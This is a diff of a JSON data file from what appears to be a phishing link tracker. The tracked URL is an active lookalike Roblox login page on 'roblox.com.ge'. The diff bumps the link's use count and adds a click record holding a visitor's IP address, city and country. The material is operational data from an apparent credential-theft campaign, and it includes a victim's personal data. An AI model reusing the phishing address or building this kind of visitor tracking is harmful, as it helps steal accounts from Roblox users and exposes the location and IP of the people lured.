@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1366,
+    "useCount": 1367,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11096,6 +11096,14 @@
         "city": "Cuenca",
         "flag": "🇪🇨",
         "countryCode": "EC"
+      },
+      {
+        "timestamp": 1777420220428,
+        "ip": "38.210.185.36",
+        "country": "Colombia",
+        "city": "Barranquilla",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
       }
     ]
   },
